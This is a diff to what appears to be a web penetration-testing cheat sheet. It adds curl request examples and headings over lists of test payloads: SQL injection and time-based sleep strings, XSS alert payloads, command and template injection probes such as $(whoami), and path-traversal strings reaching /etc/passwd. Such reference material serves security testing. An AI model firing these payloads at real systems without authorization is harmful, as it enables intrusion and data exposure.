@@ -2,25 +2,75 @@
 
 ## Simulating Requests
 
-### GET
+#### GET
 
 ```
-// Some code
+curl <url>
 ```
 
-### POST - HTTP Params
+#### HEAD
 
 ```
-// Some code
+curl -I <url>
 ```
 
-### POST - JSON
+#### GET - Params
 
+```
+curl <url>?field=value&field2=value2
+```
 
+#### GET - Follow Redirect
+
+```
+curl -L <url>
+```
+
+#### GET - Custom Headers
+
+```
+curl <url> -H "header1: value" -H "header2: value"
+```
+
+#### GET - Custom Cookies
+
+```
+curl -b "name1=value1; name2=value2" <url>
+```
+
+#### POST - Form Data
+
+```
+curl -X POST <url>
+   -H "Content-Type: application/x-www-form-urlencoded" 
+   -d "key1=value1&key2=value2" 
+```
+
+#### POST - JSON
+
+```
+curl -X POST <url>
+    -H 'Content-Type: application/json'
+    -d '{"field1":"value1","field2":"value2"}'
+```
+
+#### POST - Send File
+
+```
+curl -X POST <url> -d @<path to file>
+```
+
+#### POST - Base Auth
+
+```
+curl -X POST <url> --user "<user>:<password>"
+curl -X POST <url> -H "Authorization: Basic $(echo -n "<user>:<pass>" | base64)"
+curl -X POST <url> -H "Authorization: Bearer <token>" 
+```
 
 ## Testing parameters
 
-SQL Injection
+#### SQL Injection
 
 ```
 ''""``) or 'a' = 1;
@@ -31,7 +81,7 @@ or sleep(5)#
 " or pg_sleep(5)--
 ```
 
-XSS
+#### XSS
 
 ```
 <script>alert(document.domain)</script>
@@ -41,7 +91,7 @@ XSS
 /><img src=1 href=1 onerror="javascript:alert(document.domain)"></img>
 ```
 
-Template Injection
+#### Template Injection
 
 ```
 4*4
@@ -73,7 +123,7 @@ $(whoami)
 &&whoami
 ```
 
-Local File Inclusion
+#### Local File Inclusion
 
 ```
 ../../../../../../../../../etc/passwd
@@ -81,7 +131,7 @@ Local File Inclusion
 ..\..\..\..\..\..\..\..\..\boot.ini
 ```
 
-Remote File Inclusion
+#### Remote File Inclusion
 
 ```
 http://www.google.com
